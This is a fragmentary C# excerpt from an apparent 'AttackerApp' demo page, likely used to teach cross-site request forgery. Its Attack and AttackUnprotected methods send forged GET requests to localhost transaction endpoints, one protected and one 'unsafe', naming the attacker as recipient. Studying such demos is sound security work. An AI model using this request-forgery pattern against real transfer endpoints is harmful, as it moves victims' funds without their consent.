...
namespace AttackerApp.Pages
{
    public partial class Index
    {
        ...
        private async void Attack()
        {
            ...
            await HttpClient.GetAsync($"https://localhost:7259/transaction?recipient={AttackerName}");
        ...
        private async void AttackUnprotected()
        {
            ...
            await HttpClient.GetAsync($"https://localhost:7259/transaction-unsafe?recipient={AttackerName}");
